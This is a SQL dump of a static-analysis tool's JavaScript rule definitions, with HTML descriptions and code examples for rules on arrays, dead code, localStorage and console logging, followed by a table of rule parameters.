INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1240, '"delete" should not be used on arrays', 'S2870', NULL, 'javascript', '<p>
  The <code>delete</code> operator can be used to remove a property from any object. Arrays are objects, so the <code>delete</code> operator can be used here too,
  but if it is, a hole will be left in the array because the indexes/keys won''t be shifted to reflect the deletion.
</p>

<p>The proper method for removing an element at a certain index would be:</p>

<ul>
  <li><code>Array.prototype.splice</code> - add/remove elements from the the array</li>
  <li><code>Array.prototype.pop</code> - add/remove elements from the end of the array</li>
  <li><code>Array.prototype.shift</code> - add/remove elements from the beginning of the array</li>
</ul>

<h2>Noncompliant Code Example</h2>

<pre>
var myArray = [''a'', ''b'', ''c'', ''d''];

delete myArray[2];  // Noncompliant. myArray => [''a'', ''b'', undefined, ''d'']
console.log(myArray[2]); // expected value was ''d'' but output is undefined
</pre>

<h2>Compliant Solution</h2>

<pre>
var myArray = [''a'', ''b'', ''c'', ''d''];

// removes 1 element from index 2
removed = myArray.splice(2, 1);  // myArray => [''a'', ''b'', ''d'']
console.log(myArray[2]); // outputs ''d''
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817813368, 1510817813369, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1241, 'Useless "if(true) {...}" and "if(false){...}" blocks should be removed', 'S1145', NULL, 'javascript', '<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code> statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
<li> An if statement was changed during debugging and that debug code has been committed.</li>
<li> Some value was left unset.</li>
<li> Some logic is not doing what the programmer thought it did.</li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>

<pre>
if (true) {  // Noncompliant
  doSomething();
}
...
if (false) {  // Noncompliant
  doSomethingElse();
}

if (!options || options === true) { doThirdThing(); }  // Noncompliant; always true
</pre>
<h2>Compliant Solution</h2>

<pre>
doSomething();

doThirdThing();
</pre>
<h2>See</h2>

<ul>
<li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code</li>
<li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False</li>
<li> <a href="http://cwe.mitre.org/data/definitions/571.html">MITRE, CWE-571</a> - Expression is Always True</li>
<li> MISRA C:2004, 13.7</li>
<li> MISRA C:2012, 14.3</li>
</ul>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cwe,misra', false, 'HTML', 1510817813370, 1510817813371, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1242, 'Parameters should be passed in the correct order', 'S2234', NULL, 'javascript', '<p>When the names of arguments in a function call match the names of the function parameters, it contributes to clearer, more readable code. However, when the names match, but are passed in a different order than the function parameters, it indicates a mistake in the parameter order which will likely lead to unexpected results.</p>

<h2>Noncompliant Code Example</h2>
<pre>
function divide(var divisor, var dividend) {
  return divisor/dividend;
}

function doTheThing() {
  var divisor = 15;
  var dividend = 5;

  var result = divide(dividend, divisor);  // Noncompliant; operation succeeds, but result is unexpected
  //...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
function divide(var divisor, var dividend) {
  return divisor/dividend;
}

public void doTheThing() {
  var divisor = 15;
  var dividend = 5;

  var result = divide(divisor, dividend);
  //...
}
</pre>', 4, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817813371, 1510817813372, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1243, 'Useless parentheses around expressions should be removed to prevent any misunderstanding', 'Parentheses', NULL, 'javascript', '<p>Useless parentheses can sometimes be misleading and so should be removed. </p>
<p>The following code snippet illustrates this rule:</p>
<pre>
return 3;             // Compliant
return (x);           // Non-Compliant
return (x + 1);       // Non-Compliant
int x = (y / 2 + 1);  // Non-Compliant
int y = (4+X) * y;    // Compliant
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'confusing', false, 'HTML', 1510817813372, 1510817813373, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1244, '"switch" statements should have at least 3 "case" clauses', 'S1301', NULL, 'javascript', '<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>
<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>
<h2>Noncompliant Code Example</h2>

<pre>
switch (variable) {
  case 0:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>

<pre>
if (variable == 0) {
  doSomething();
} else {
  doSomethingElse();
}
</pre>
<h2>See</h2>

<ul>
<li> MISRA C:2004, 15.5 - Every switch statement shall have at least one case clause.</li>
<li> MISRA C++:2008, 6-4-8 - Every switch statement shall have at least one case-clause.</li>
<li> MISRA C:2012, 16.6 - Every switch statement shall have at least two switch-clauses</li>
</ul>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'misra', false, 'HTML', 1510817813373, 1510817813374, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1245, 'Files should not have too many lines', 'S104', NULL, 'javascript', '<p>
  A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain.</br>
  Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks.</br>
  Those smaller files will not only be easier to understand but also probably easier to test.
</p>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'brain-overload', false, 'HTML', 1510817813374, 1510817813375, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1246, 'Local storage should not be used', 'S3271', NULL, 'javascript', '<p>Session storage and local storage are HTML 5 features which allow developers to easily store megabytes of data client-side, as opposed to the 4Kb cookies can accommodate. While useful to speed applications up on the client side, it can be dangerous to store sensitive information this way because the data is not encrypted by default and any script on the page may access it.</p>
<p>This rule raises an issue when the <code>localStorage</code> and <code>sessionStorage</code> API''s are used.</p>
<h2>Noncompliant Code Example</h2>

<pre>
localStorage.setItem("login", login); // Noncompliant
sessionStorage.setItem("sessionId", sessionId); // Noncompliant
</pre>
<h2>See</h2>

<ul>
<li> <a href="https://dl.packetstormsecurity.net/papers/attack/HTML5AttackVectors_RafayBaloch_UPDATED.pdf">Packet Storm Security</a> - HTML 5 Modern Day Attack And Defence Vectors
</li><li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure
</li></ul>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'LINEAR_OFFSET', NULL, '5min', NULL, '1h', 'per additional use of the api', NULL, 'owasp-a6', false, 'HTML', 1510817813376, 1510817813376, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1247, 'Non-empty statements should have at least one side-effect', 'S905', NULL, 'javascript', '<p>An expression statement without side effects, such as a comparison without assigning its result to a variable, is useless, and must have been a mistake on the developer''s part.</p>

<h2>Noncompliant code example</h2>

<pre>
var str = "long string split on multiple lines but" // without concatenation operator, statement implicitly ends at the linebreak
  " the concatenation operator + is missing";  // Noncompliant

a == 1;   // Noncompliant; was assignment intended?
</pre>

<h2>See</h2>
<ul><li><a href="http://cwe.mitre.org/data/definitions/482">MITRE, CWE-482</a> - Comparing instead of Assigning</li></ul>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cwe,unused', false, 'HTML', 1510817813377, 1510817813377, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1248, 'Console logging should not be used', 'S2228', NULL, 'javascript', '<p>
  Debug statements are always useful during development. But include them in production code - particularly in code that runs client-side - and you run the risk of inadvertently exposing sensitive information, slowing down the browser, or even erroring-out the site for some users. (Not all browsers support <code>console.log()</code>).
</p>

<h2>Noncompliant Code Example</h2>
<pre>
console.log(password_entered); // Noncompliant
</pre>

<h2>See</h2>

<ul>
<li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure </li>
</ul>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'owasp-a6', false, 'HTML', 1510817813378, 1510817813378, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1249, 'Class names and file names should match', 'S3317', NULL, 'javascript', '<p>By convention, a file that exports only one class should be named for that class. Anything else may confuse maintainers.</p>

<h2>Noncompliant Code Example</h2>
<pre>
// file path: myclass.js  -- Noncompliant
class MyClass {
  // ...
}
export default MyClass;
</pre>

<h2>Compliant Solution</h2>
<pre>
// file path: MyClass.js
class MyClass {
  // ...
}
export default MyClass;
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'confusing,es2015', false, 'HTML', 1510817813379, 1510817813379, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1250, 'Loops should not contain more than a single "break" or "continue" statement', 'TooManyBreakOrContinueInLoop', NULL, 'javascript', '<p>
  Restricting the number of <code>break</code> and <code>continue</code> statements in a loop is done in the interest of good structured programming.
</p>

<p>
  One <code>break</code> and <code>continue</code> statement is acceptable in a loop, since it facilitates optimal coding. If there is more than one, the code should be refactored to increase readability.
</p>

<h2>Noncompiant Code Example</h2>
<pre>
for (var i = 1; i <= 10; i++) {  // Noncompliant - 2 continue - one might be tempted to add some logic in between
  if (i % 2 == 0) {
    continue;
  }

  if (i % 3 == 0) {
    continue;
  }

  alert("i = " + i);
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '20min', NULL, NULL, 'per extra "break" or "continue" statement', NULL, 'brain-overload', false, 'HTML', 1510817813380, 1510817813380, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1260, 'Files should contain an empty new line at the end', 'MissingNewlineAtEndOfFile', NULL, 'javascript', '<p>Some tools such as Git work better when files end with an empty line.</p>
<p>This rule simply generates an issue if it is missing.</p>
<p>For example, a Git diff look like:</p>
<pre>
+class Test {
+}
\ No newline at end of file
</pre>
<p>if the empty line is missing at the end of the file.</p>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817813391, 1510817813391, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1251, 'Variables should not be self-assigned', 'S1656', NULL, 'javascript', '<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake and some other value or variable was intended for the assignment instead.</p>

<h2>Noncompliant Code Example</h2>
<pre>
function setName(name) {
    name = name;
}
</pre>

<h2>Compliant Solution</h2>
<pre>
function setName(name) {
    this.name = name;
}
</pre>

<h2>See</h2>
<ul>
<li><a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect</li>
<li><a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>
</ul>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '3min', NULL, NULL, 'cert', false, 'HTML', 1510817813381, 1510817813382, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1252, 'Lines should not be too long', 'LineLength', NULL, 'javascript', '<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817813382, 1510817813383, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1253, 'JavaScript parser failure', 'ParsingError', NULL, 'javascript', '<p>When the JavaScript parser fails, it is possible to record the failure as a violation on the file. This way, not only it is possible to track the number of files that do not parse but also to easily find out why they do not parse.</p>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, NULL, false, 'HTML', 1510817813384, 1510817813384, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1254, 'Variables should be declared before they are used', 'VariableDeclarationAfterUsage', NULL, 'javascript', '<p>One of the biggest sources of confusion for JavaScript beginners is scoping. The reason scoping is so confusing in JavaScript is because JavaScript looks like a C-family language but doesn''t act like one. C-family languages have block-level scope, meaning that when control enters a block, such as an <code>if</code> statement, new variables can be declared within that scope without affecting the outer scope. However, this is not the case in JavaScript.</p>
<p>To minimize confusion as much as possible, variables should always be declared before they are used.</p>
<h2>Noncompliant Code Example</h2>

<pre>
var x = 1;

function fun(){
  alert(x); // Noncompliant as x is declared later in the same scope
  if(something) {
    var x = 42; // Declaration in function scope (not block scope!) shadows global variable
  }
}

fun(); // Unexpectedly alerts "undefined" instead of "1"
</pre>
<h2>Compliant Solution</h2>

<pre>
var x = 1;

function fun() {
  print(x);
  if (something) {
    x = 42;
  }
}

fun(); // Print "1"
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813385, 1510817813385, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1255, '"eval" and "arguments" should not be bound or assigned', 'BoundOrAssignedEvalOrArguments', NULL, 'javascript', '<p>In JavaScript, <code>eval</code> is used to evaluate a string as JavaScript code, and <code>arguments</code> is used to access function arguments through indexed properties.
  As a consequence, <code>eval</code> and <code>arguments</code> should not be bound or assigned, because doing so would overwrite the original definitions of those two reserved words. </p>

<p>What''s more, using either of those two names to assign or bind will generate an error in JavaScript strict mode code.</p>
<h2>Noncompliant Code Example</h2>

<pre>
eval = 17; // Noncompliant
arguments++; // Noncompliant
++eval; // Noncompliant
var obj = { set p(arguments) { } }; // Noncompliant
var eval; // Noncompliant
try { } catch (arguments) { } // Noncompliant
function x(eval) { } // Noncompliant
function arguments() { } // Noncompliant
var y = function eval() { }; // Noncompliant
var f = new Function("arguments", "return 17;"); // Noncompliant

function fun() {
  if (arguments.length == 0) { // Compliant
    // do something
  }
}
</pre>
<h2>Compliant Solution</h2>

<pre>
result = 17;
args++;
++result;
var obj = { set p(arg) { } };
var result;
try { } catch (args) { }
function x(arg) { }
function args() { } 
var y = function fun() { }; 
var f = new Function("args", "return 17;");

function fun() {
  if (arguments.length == 0) {
    // do something
  }
}
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817813386, 1510817813386, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1256, 'Internet Explorer''s conditional comments should not be used', 'ConditionalComment', NULL, 'javascript', '<p>
  Internet Explorer offers a way to change the JavaScript code at runtime using conditional comments (activated by a @cc_on statement found in a comment). Using this preprocessing feature decreases readability and maintainability, and can hinder automated tools. What''s more, it is specific to Internet Explorer and won''t work for other browsers.
</p>

</p>
  Most of the time, using those conditional comments can be easily avoided with some refactoring - using modern cross-browsers JavaScript frameworks and libraries.
  The following code snippet illustrates the use of conditional comments:
</p>

<h2>Noncompliant Code Example</h2>
<pre>
/*@cc_on
  @if (@_jscript_version >= 5.5)
    document.write("You are using IE5.5 or newer");
  @else
    document.write("You are using IE5 or older");
  @end
  @*/
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cross-browser', false, 'HTML', 1510817813387, 1510817813387, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1257, 'The names of model properties should not contains spaces', 'S2508', NULL, 'javascript', '<p>
  When using the Backbone.js framework, the names of model attributes should not contain spaces. This is because the Events object accepts space-delimited lists of events, so an attributes with spaces in the names could be misinterpreted.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
Person = Backbone.Model.extend({
        defaults: {
            ''first name'': ''Bob'',      // Noncompliant
            ''birth date'': new Date()  // Noncompliant
        },
    });
</pre>

<h2>Compliant Solution</h2>
<pre>
Person = Backbone.Model.extend({
        defaults: {
            firstName: ''Bob'',
            birthDate: new Date()
        },
    });
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'backbone', false, 'HTML', 1510817813388, 1510817813388, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1258, '"FIXME" tags should be handled', 'S1134', NULL, 'javascript', '<p>
  <code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.
</p>
<p>
  Sometimes the developer will not have the time or will simply forget to get back to that tag.
  This rule is meant to track those tags, and ensure that they do not go unnoticed.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
function divide(numerator, denominator) {
  return numerator / denominator;              // FIXME denominator value might be  0
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817813389, 1510817813389, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1259, '"TODO" tags should be handled', 'S1135', NULL, 'javascript', '<p>
  <code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.
</p>
<p>
  Sometimes the developer will not have the time or will simply forget to get back to that tag.
  This rule is meant to track those tags, and ensure that they do not go unnoticed.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
function doSomething() {
  // TODO
}
</pre>', 0, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817813390, 1510817813390, 1);


--
-- Data for Name: rules_parameters; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (1, 2, 'maximumAsserts', 'Maximum number of Asserts in a test method', 'INTEGER', '1');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (2, 18, 'minimumBranchCoverageRatio', NULL, 'FLOAT', '65');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (3, 19, 'minimumLineCoverageRatio', NULL, 'FLOAT', '65');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (4, 20, 'minimumCommentDensity', NULL, 'FLOAT', '25');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (5, 24, 'minimumBranchCoverageRatio', NULL, 'FLOAT', '65');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (6, 25, 'minimumLineCoverageRatio', NULL, 'FLOAT', '65');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (7, 26, 'minimumCommentDensity', NULL, 'FLOAT', '25');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (8, 39, 'prefix', 'A variable prefix to skip, i.e., m_', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (9, 42, 'ignoreAnnotations', 'Ignore annotations. Default is false.', 'BOOLEAN', 'false');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (10, 46, 'minimum', 'The class size reporting threshold. Default is 1000.', 'INTEGER', '1000');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (11, 47, 'minimum', 'Number of characters that are required as a minimum for a variable name', 'INTEGER', '3');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (12, 56, 'violationSuppressRegex', 'Suppress violations with messages matching a regular expression', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (13, 56, 'violationSuppressXPath', 'Suppress violations on nodes which match a given relative XPath expression', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (14, 56, 'maxLineLength', 'Maximum line length', 'INTEGER', '80');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (15, 56, 'maxLines', 'Maximum lines', 'INTEGER', '6');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (16, 57, 'minimum', 'The switch statement ratio reporting threshold. Default is 10.', 'INTEGER', '10');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (17, 63, 'minimum', 'The npath reporting threshold. Default is 200.', 'INTEGER', '200');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (18, 71, 'pattern', 'Regular Expression. Default is ^[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}$', 'STRING', '^[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (19, 85, 'staticLoggerName', 'Default is LOG', 'STRING', 'LOG');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (20, 86, 'minimum', 'The constructor NCSS count reporting threshold. Default is 100.', 'INTEGER', '100');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (21, 101, 'memberPrefix', 'A prefix for member variables', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (22, 101, 'staticPrefix', 'A prefix for static variables', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (23, 101, 'staticSuffix', 'A suffix for static variables', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (24, 101, 'memberSuffix', 'A suffix for member variables', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (25, 105, 'minimum', 'The import count reporting threshold. Default is 30.', 'INTEGER', '30');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (26, 109, 'regex', 'Regular expression', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (27, 109, 'violationSuppressRegex', 'Suppress violations with messages matching a regular expression', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (28, 109, 'violationSuppressXPath', 'Suppress violations on nodes which match a given relative XPath expression', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (29, 111, 'maxViolations', 'The maximum number of violations per class. Default is 100.', 'INTEGER', '100');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (30, 111, 'maxPaths', 'The maximum number of checked paths per method. A lower value will increase the performance of the rule but may decrease the number of found anomalies. Default is 1000.', 'INTEGER', '1000');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (31, 124, 'showMethodsComplexity', 'Add method average violations to the report', 'BOOLEAN', 'true');
